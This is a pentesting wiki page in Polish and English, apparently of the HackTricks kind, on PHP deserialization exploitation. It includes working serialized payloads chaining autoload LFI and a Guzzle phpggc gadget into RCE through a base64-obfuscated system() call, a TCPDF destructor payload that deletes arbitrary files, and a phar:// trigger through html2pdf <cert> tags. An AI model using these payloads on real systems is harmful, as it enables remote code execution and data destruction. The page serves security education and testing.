# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Najpierw powinieneś sprawdzić, czym są [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Jesteśmy w sytuacji, w której znaleźliśmy **PHP deserialization in a webapp** bez żadnej biblioteki podatnej na gadgety w **`phpggc`**. Jednak w tym samym kontenerze znajdował się inny composer webapp z podatnymi bibliotekami. Dlatego celem było **load the composer loader of the other webapp** i wykorzystanie go do **load a gadget that will exploit that library with a gadget** z webappa podatnego na deserialization.

Steps:

- Znalazłeś **deserialization** i w aktualnym kodzie aplikacji **there **isn’t any gadget****  
- Możesz wykorzystać funkcję **`spl_autoload_register`** jak poniżej, aby **załadować dowolny lokalny plik z rozszerzeniem `.php`**
- W tym celu używasz deserialization, gdzie nazwa klasy trafi do **`$name`**. Nie możesz użyć "/" ani "." w nazwie klasy w zserializowanym obiekcie, ale **kod** **zamienia** **podkreślenia** ("\_") **na ukośniki** ("/"). Zatem nazwa klasy taka jak `tmp_passwd` zostanie przekształcona w `/tmp/passwd.php`, a kod spróbuje ją załadować.\
Przykład **gadget** będzie: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Jeśli masz **file upload** i możesz przesłać plik z **`.php extension`** możesz **wykorzystać tę funkcjonalność bezpośrednio** i uzyskać już RCE.

W moim przypadku nie miałem niczego takiego, ale wewnątrz tego **same container** znajdowała się inna strona webowa używająca composer z **library vulnerable to a `phpggc` gadget**.

- Aby załadować tę inną bibliotekę, najpierw musisz **load the composer loader of that other web app** (ponieważ loader bieżącej aplikacji nie będzie miał dostępu do bibliotek tamtej aplikacji). **Znając ścieżkę aplikacji**, możesz to osiągnąć bardzo łatwo za pomocą: **`O:28:"www_frontend_vendor_autoload":0:{}`** (W moim przypadku composer loader był w `/www/frontend/vendor/autoload.php`)
- Teraz możesz **load** composer loader tamtej aplikacji, więc czas **`generate the phpgcc`** **payload** do użycia. W moim przypadku użyłem **`Guzzle/FW1`**, który pozwolił mi **zapisać dowolny plik w systemie plików**.
- NOTE: The **generated gadget was not working**, aby zadziałało musiałem **zmodyfikować** ten payload **`chain.php`** of phpggc i ustawić **all the attribute**s klas **from private to public**. Jeśli nie, po deserializacji stringa atrybuty utworzonych obiektów nie miały żadnych wartości.
- Teraz mamy sposób, aby **load the others app composer loader** i mieć działający **phpggc payload**, ale musimy wykonać to W TYM SAMYM ŻĄDANIU, aby loader został załadowany, kiedy gadget zostanie użyty. W tym celu wysłałem serializowaną tablicę z obydwoma obiektami, np.:
- Widać **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Teraz możemy **utworzyć i zapisać plik**, jednak użytkownik **nie mógł zapisywać w żadnym katalogu na serwerze WWW**. Jak widać w payload, PHP wywołujący **`system`** z pewnym **base64** zostaje utworzony w **`/tmp/a.php`**. Następnie możemy **ponownie wykorzystać pierwszy typ payloadu**, którego użyliśmy jako LFI do załadowania composer loader innej webapp, **aby załadować wygenerowany `/tmp/a.php`**. Wystarczy dodać go do deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Podsumowanie payloadu**

- **Wczytaj composer autoload** innego webapp w tym samym containerze
- **Wczytaj phpggc gadget** aby wykorzystać bibliotekę z innego webapp (initial webapp podatny na deserializację nie miał żadnego gadgeta w swoich bibliotekach)
- Gadget **utworzy plik z payloadem PHP** w /tmp/a.php zawierający złośliwe polecenia (użytkownik webapp nie może zapisywać w żadnym folderze żadnego webapp)
- Ostateczna część payloadu użyje **wczytania wygenerowanego pliku php**, który wykona komendy

Musiałem **wykonać tę deserializację dwukrotnie**. W moich testach pierwszy raz plik `/tmp/a.php` został utworzony, ale nie załadowany, a za drugim razem został poprawnie załadowany.

## TCPDF `__destruct` POP chain umożliwiający dowolne usunięcie pliku

When a real `TCPDF` instance is garbage-collected it calls `_destroy(true)`, iterates over `$this->imagekeys`, and `unlink()`s anything that looks like a cache file under `K_PATH_CACHE`. Jeśli aplikacja wykonuje `unserialize($user_data)` podczas gdy klasa `TCPDF` jest załadowana (np. spodziewa się tablicy z kluczem `html`), możesz dostarczyć zserializowany obiekt, który ustawia:

- `file_id` na dowolny integer, który nie występuje w `self::$cleaned_ids` (np. `-1`).
- `imagekeys` na ścieżki zaczynające się od `K_PATH_CACHE` lub które można tak spreparować, żeby wyglądały jak one (np. `/tmp/../tmp/do_not_delete_this_file.txt` gdy `K_PATH_CACHE` to `/tmp/`).

Przykładowy payload uderzający w niebezpieczny przepływ `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Plik jest usuwany, gdy tylko obiekt wyjdzie poza zakres. TCPDF 6.9.3 zaostrzył sprawdzenie, aby usuwać tylko ścieżki z prefiksem `__tcpdf_<file_id>_` wewnątrz `K_PATH_CACHE` i wprowadził `_unlink()`, aby blokować schematy inne niż `file://`, więc starsze wersje `Producer` są doskonałymi celami.

### Wywołanie gadgetu przez `phar://` w html2pdf `<cert>` tagach

`spipu/html2pdf` (≤5.3.0) opakowuje TCPDF i udostępnia niestandardowy blok `<cert>`, którego atrybuty `src`/`privkey` są weryfikowane za pomocą zwykłego `file_exists()`. W PHP < 8.0 każda funkcja systemu plików, która dotyka URL `phar://`, powoduje unserializowanie metadanych Phar. Przechowując powyższy złośliwy obiekt TCPDF w metadanych archiwum Phar, uzyskujesz niezawodny POP nawet jeśli aplikacja nigdy nie wywołuje `unserialize()`.

1. Przygotuj Phar z `phar.readonly=0`, ustaw stub/manifest tak, aby wyglądał jak obraz (np. zmień nazwę `archive.phar` na `archive.png`), i umieść zserializowany obiekt TCPDF w metadanych Phar.
2. Prześlij/umieść plik w miejscu dostępnym, np. w `/tmp/user_files/user_1/archive.png`.
3. Prześlij HTML zawierający tag `<cert>`, tak aby html2pdf rozwiązał sterowaną przez atakującego ścieżkę:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Wywołanie `file_exists()` deserializuje metadane, instancjuje TCPDF, a jego destruktor usuwa wybrany plik, przekształcając html2pdf w potężny punkt wejścia `phar://`. Wersja 5.3.1 dodała `Security::checkValidPath()` do blokowania niezatwierdzonych schematów, więc starsze wdrożenia pozostają atrakcyjne.

## Źródła

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
